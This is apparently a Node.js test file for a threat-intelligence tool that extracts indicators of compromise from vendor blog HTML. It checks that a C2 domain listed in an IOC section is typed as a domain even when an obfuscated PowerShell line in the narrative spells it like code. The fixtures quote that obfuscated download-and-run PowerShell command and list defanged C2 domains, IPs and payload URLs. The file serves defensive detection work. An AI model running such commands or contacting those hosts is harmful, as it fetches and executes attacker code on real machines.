/**
 * Dotted-token typing of a publisher IOC row (tl-candidates-v15 /
 * tl-type-resolver-v5).
 *
 * An HTML IOC list written as one paragraph of <br>-split lines becomes
 * paragraph blocks sharing a `line_group`, so every value line arrives with
 * form `standalone`. The occurrence layer already read such a line as an
 * indicator row for its focused value (row_shape → asserted), but the
 * dotted-token type vote only knew list / table forms, so the row voted with
 * the weakest reading (hostname_shape). A narrative code-shaped spelling of the
 * same value ("iRM sTrapnESs[.]COM" in an obfuscated PowerShell line) then
 * turned the publisher's domain into a context-only technical artifact, and
 * the report showed one Indicator less than the publisher declared.
 *
 * Fixture values follow a public vendor article (defanged as published);
 * hashes are synthetic.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { extractCanonicalDocumentFromHtml } from './extract/extractHtml.js';
import { extractCandidatesWithDiagnostics } from './candidateExtraction.js';
import { buildCandidateEvidenceRecord, isPublisherAuthoritativeReportIocMember } from './evidencePolicy.js';
import { isActionableReviewIndicator } from './promotion.js';

const SOURCE = 'https://research.example/blog/node-js-loader/';
const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');
const SHA_AGENT = sha('dotted-row-agent');
const SHA_NODE = sha('dotted-row-evasion-node');
const SHA_BEACON = sha('dotted-row-beacon');

function htmlDoc(inner) {
  return `<!doctype html><html lang="en"><head><title>Dotted row fixture</title></head><body><article>
<h1>Old technique makes a comeback</h1>
<p>Background paragraph describing the intrusion, the loader chain and the operator tradecraft across several victims.</p>
${inner}
</article></body></html>`;
}

function extractWithDiagnostics(inner) {
  const r = extractCanonicalDocumentFromHtml(htmlDoc(inner), { url: SOURCE, finalUrl: SOURCE, httpStatus: 200 });
  assert.equal(r.ok, true, `extraction failed: ${r.code}`);
  return extractCandidatesWithDiagnostics(r.document, { sourceUrl: SOURCE });
}
const extract = (inner) => extractWithDiagnostics(inner).candidates;

const keyOf = (c) => `${c.candidate_type}:${c.normalized_value}`;
const find = (cands, type, value) => cands.find((c) => c.candidate_type === type && c.normalized_value === value) || null;
const forValue = (cands, value) => cands.filter((c) => String(c.normalized_value).toLowerCase() === value);
const withEvidence = (c) => ({ ...c, evidence: buildCandidateEvidenceRecord(c) });
const isMember = (c) => Boolean(c) && isActionableReviewIndicator(withEvidence(c));
const memberKeys = (cands) => cands.filter(isMember).map(keyOf).sort();

/** Obfuscated PowerShell narrative: a code-shaped spelling of the C2 domain. */
const codeMention = (n) =>
  `<p>"CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe" -winD Minim $fApO${n}=iRM sTrapnESs[.]COM;$ZXz=[sYstEM.ENvirONMEnt]::cOmMAnDlInE;.$zXz $faPo${n}</p>`;

const NARRATIVE = `
<h2>Asian technology organization</h2>
${codeMention(1)}
<p>The command rebuilt the name of a PowerShell download cmdlet, then used it to fetch and run a script from strapness[.]com, appending a long token to the request.</p>
<p>The attackers also staged an evasion.node module and downloaded Node.js from nodejs[.]org before running the loader.</p>`;

const IOC_SECTION = `
<h2>Indicators of Compromise</h2>
<p><strong>File indicators</strong></p>
<p>${SHA_AGENT} - age64.exe - AdaptixC2 agent<br>${SHA_NODE} - evasion.node - Nodejs module<br>${SHA_BEACON} - thread.exe - CS Beacon&nbsp;<br>${SHA_BEACON} - thread.exe - Cobalt Strike<br>${SHA_NODE}&nbsp; - evasion.node</p>
<p>&nbsp;</p>
<p><strong>Network indicator(s):</strong></p>
<p>142.93.242[.]144<br>45.158.196[.]23:8888 – C2Looper C&amp;C<br>chat[.]doctecsolutions[.]com – C&amp;C<br>resources[.]datalayerservice.com<br>strapness[.]com<br>defs.updater-worelos[.]com<br>hxxp://193.58.122[.]42/files/hvnc2.exe<br>hxxp://thomphon[.]com/update.msi<br>hxxps://toogwido.sa[.]com/Ca.ps1<br>thomphon[.]com<br>toogwido.sa[.]com</p>`;

test('<br>-split publisher IOC row keeps its domain identity against a narrative code-shaped spelling', () => {
  const cands = extract(NARRATIVE + IOC_SECTION);
  const all = forValue(cands, 'strapness.com');
  assert.equal(all.length, 1, `one identity for the value, got ${all.map(keyOf).join(', ')}`);
  const domain = find(cands, 'domain', 'strapness.com');
  assert.ok(domain, 'canonical identity domain|strapness.com');
  assert.equal(domain.is_ioc, true);
  assert.equal(cands.some((c) => c.candidate_type === 'technical_artifact' && /strapness/i.test(c.normalized_value)), false);

  const row = domain.occurrences.find((o) => o.section_heading === 'Indicators of Compromise');
  assert.ok(row, 'IOC-section occurrence recorded');
  assert.equal(row.asserted, true);
  assert.equal(row.occurrence_kind, 'standalone_indicator_row');
  // The narrative mentions stay occurrences of the same identity, unasserted.
  assert.ok(domain.occurrences.filter((o) => o.asserted !== true).length >= 2);

  assert.equal(isPublisherAuthoritativeReportIocMember(withEvidence(domain)), true);
  assert.equal(isMember(domain), true, 'counted in the report review (Indicators) set');
});

test('several narrative code-shaped mentions cannot outvote the publisher row (precedence, not weight)', () => {
  const narrative = `<h2>Asian technology organization</h2>${codeMention(1)}${codeMention(2)}${codeMention(3)}`;
  const cands = extract(narrative + IOC_SECTION);
  const domain = find(cands, 'domain', 'strapness.com');
  assert.ok(domain, 'domain|strapness.com survives three artifact votes');
  assert.equal(forValue(cands, 'strapness.com').length, 1);
  const { scores } = domain.type_resolution;
  assert.ok(scores.artifact > scores.domain, `the raw score alone would have lost (${JSON.stringify(scores)})`);
  assert.equal(isMember(domain), true);
});

test('a file name in a hash row description stays a technical artifact inside the IOC section', () => {
  const cands = extract(NARRATIVE + IOC_SECTION);
  assert.equal(find(cands, 'domain', 'evasion.node'), null);
  const artifact = find(cands, 'technical_artifact', 'evasion.node');
  assert.ok(artifact, 'evasion.node keeps its artifact identity');
  assert.equal(artifact.is_ioc, false);
  assert.equal(isMember(artifact), false);
  for (const o of artifact.occurrences.filter((x) => x.section_heading === 'Indicators of Compromise')) {
    assert.notEqual(o.asserted, true, `${o.block_id} is a description, not the row value`);
  }
  const hash = find(cands, 'sha256', SHA_NODE);
  assert.ok(hash);
  assert.equal(isMember(hash), true);
});

test('MODE A: report Indicators are exactly the publisher identities; boundary guards hold', () => {
  const cands = extract(NARRATIVE + IOC_SECTION);
  assert.deepEqual(
    memberKeys(cands),
    [
      `sha256:${SHA_AGENT}`,
      `sha256:${SHA_BEACON}`,
      `sha256:${SHA_NODE}`,
      'domain:chat.doctecsolutions.com',
      'domain:defs.updater-worelos.com',
      'domain:resources.datalayerservice.com',
      'domain:strapness.com',
      'domain:thomphon.com',
      'domain:toogwido.sa.com',
      'ip:142.93.242.144',
      'ip:45.158.196.23',
      'url:http://193.58.122.42/files/hvnc2.exe',
      'url:http://thomphon.com/update.msi',
      'url:https://toogwido.sa.com/Ca.ps1'
    ].sort()
  );

  // Duplicate publisher hash rows: one identity, one asserted occurrence per row.
  for (const h of [SHA_NODE, SHA_BEACON]) {
    const c = find(cands, 'sha256', h);
    assert.equal(cands.filter((x) => x.normalized_value === h).length, 1);
    assert.equal(c.occurrences.filter((o) => o.asserted === true).length, 2);
  }
  // IP:port → ip identity with the port on its occurrence.
  const endpoint = find(cands, 'ip', '45.158.196.23');
  assert.ok(endpoint.occurrences.some((o) => o.form === 'ip_port' && o.port === 8888));
  // The host of an IP URL is URL metadata, not a standalone IP.
  assert.equal(find(cands, 'ip', '193.58.122.42'), null);
  // A narrative-only domain stays out of a curated report's Indicators.
  const narrativeOnly = find(cands, 'domain', 'nodejs.org');
  assert.ok(narrativeOnly);
  assert.equal(isMember(narrativeOnly), false);
});

test('MODE B: without a curated IOC section the narrative code-shaped token keeps its artifact reading', () => {
  const { candidates, diagnostics } = extractWithDiagnostics(NARRATIVE);
  // Unchanged: an incidental code-shaped identifier in prose is excluded, never a domain.
  assert.deepEqual(forValue(candidates, 'strapness.com'), []);
  const typed = diagnostics.type_resolution.examples.find((e) => /strapness/i.test(e.raw));
  assert.equal(typed.resolved_type, 'technical_artifact');
  assert.equal(typed.reason, 'code_identifier_shape');
  assert.equal(typed.signals.explicit_indicator_row, false);
});
